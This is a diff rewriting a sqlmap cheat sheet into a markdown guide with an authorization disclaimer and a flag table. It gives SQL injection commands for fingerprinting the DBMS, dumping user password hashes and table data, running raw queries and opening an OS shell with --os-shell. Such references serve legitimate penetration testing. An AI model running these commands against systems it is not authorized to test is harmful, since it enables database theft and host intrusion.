@@ -1,45 +1,64 @@
-# Test URL and POST data and return database banner (if possible)
-./sqlmap.py --url="<url>" --data="<post-data>" --banner
+# sqlmap — real-world examples
 
-# Parse request data and test | request data can be obtained with burp
-./sqlmap.py -r <request-file> <options>
+> Only run sqlmap against systems you own or are explicitly authorized to test.
 
-# Fingerprint | much more information than banner
-./sqlmap.py -r <request-file> --fingerprint
+## Test a URL with POST data and grab the DB banner
 
-# Get database username, name, and hostname
-./sqlmap.py -r <request-file> --current-user --current-db --hostname
+```sh
+sqlmap --url="http://target/login" --data="user=a&pass=b" --banner
+```
 
-# Check if user is a database admin
-./sqlmap.py -r <request-file> --is-dba
+## Replay a captured request (e.g. saved from Burp)
 
-# Get database users and password hashes
-./sqlmap.py -r <request-file> --users --passwords
+```sh
+sqlmap -r request.txt --batch
+```
 
-# Enumerate databases
-./sqlmap.py -r <request-file> --dbs
+## Fingerprint the backend DBMS
 
-# List tables for one database
-./sqlmap.py -r <request-file> -D <db-name> --tables
+```sh
+sqlmap -r request.txt --fingerprint
+```
 
-# Other database commands
-./sqlmap.py -r <request-file> -D <db-name> --columns
-                                           --schema
-                                           --count
-# Enumeration flags
-./sqlmap.py -r <request-file> -D <db-name>
-                              -T <tbl-name>
-                              -C <col-name>
-                              -U <user-name>
+## Identify current user, database, and hostname
 
-# Extract data
-./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump
+```sh
+sqlmap -r request.txt --current-user --current-db --hostname
+```
 
-# Execute SQL Query
-./sqlmap.py -r <request-file> --sql-query="<sql-query>"
+## Check for DBA privileges
 
-# Append/Prepend SQL Queries
-./sqlmap.py -r <request-file> --prefix="<sql-query>" --suffix="<sql-query>"
+```sh
+sqlmap -r request.txt --is-dba
+```
 
-# Get backdoor access to sql server | can give shell access
-./sqlmap.py -r <request-file> --os-shell
+## Enumerate databases, tables, columns
+
+```sh
+sqlmap -r request.txt --dbs
+sqlmap -r request.txt -D appdb --tables
+sqlmap -r request.txt -D appdb -T users --columns
+```
+
+## Dump data from a table
+
+```sh
+sqlmap -r request.txt -D appdb -T users -C username,password --dump
+```
+
+## Run a raw SQL query
+
+```sh
+sqlmap -r request.txt --sql-query="SELECT version()"
+```
+
+## Flag reference
+
+| Flag           | What it does                        |
+| -------------- | ----------------------------------- |
+| -r file        | load an HTTP request from a file    |
+| --data         | POST body to test                   |
+| --batch        | accept default answers, no prompts  |
+| -D / -T / -C   | scope to db / table / column        |
+| --dump         | extract the selected data           |
+| --os-shell     | attempt an interactive OS shell     |
